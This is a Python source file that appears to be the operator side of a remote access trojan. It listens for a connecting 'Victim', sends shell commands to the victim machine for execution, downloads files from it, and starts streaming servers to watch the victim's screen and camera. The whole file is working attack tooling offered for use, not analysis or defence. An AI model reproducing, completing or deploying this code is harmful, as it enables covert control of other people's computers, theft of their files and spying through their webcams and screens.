#   Created By @alm3jzh 
#                       IG : @qhwp
# 
# 
# 
# 
# 

RED = "\033[91m"
CYAN = "\033[96m"
GREEN = "\033[92m"
PURPLE = "\033[95m"
RESET = "\033[0m"
import socket
import threading
from vidstream import StreamingServer
import math

IP = "192.168.204.128"
PORT = 5554  # Changed port from 4444 to 5555
ENCODE = "utf-8"
SIZE = 4096
path = ""


def receive_file(conn, filename):
    filesize = conn.recv(SIZE).decode(ENCODE)
    filesize = int(filesize)
    if filesize == 0:
        print("[-] File or Folder not found on client.")
        return
    if not filename.endswith(".zip") and "." not in filename:
        filename += ".zip"
    with open(filename, "wb") as f:
        remaining = filesize
        while remaining > 0:
            data = conn.recv(min(SIZE, remaining))
            if not data:
                break
            f.write(data)
            remaining -= len(data)
    print(f"[+] {filename} downloaded successfully.")


def screen_record():
    receiver = StreamingServer(IP, 9999)  # Use a different port for streaming
    receiver.start_server()
    print("[+] Screen sharing server started. Waiting for client connection...")

def camera_record():
    receivercam = StreamingServer(IP, 9999)  # Use a different port for streaming
    receivercam.start_server()
    print("[###*###] Camera sharing server started. Waiting for client connection...")


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
    server.bind((IP, PORT))
    server.listen()
    print(f"[+] Server listening on {IP}:{PORT}...")
    connection, address = server.accept()
    print(f"[+] New Victim connected from {address[0]}:{address[1]}")
    while True:
        command = input(f"{path}/> ")
        if not command.strip():
            continue

        if command == "screen":
            # Start the screen sharing server locally
            thread = threading.Thread(target=screen_record)
            thread.start()
            # Then tell the client to start streaming
            connection.send(command.encode(ENCODE))
            print("[+] Requested screen sharing from client")
        elif command.startswith("download "):
            connection.send(command.encode(ENCODE))
            filename = command.split()[1]
            receive_file(connection, filename)
        elif command == "camera":
            thread = threading.Thread(target=camera_record)
            thread.start()
        else:
            connection.send(command.encode(ENCODE))
            output = connection.recv(SIZE)
            print(output.decode(ENCODE, errors="ignore"))
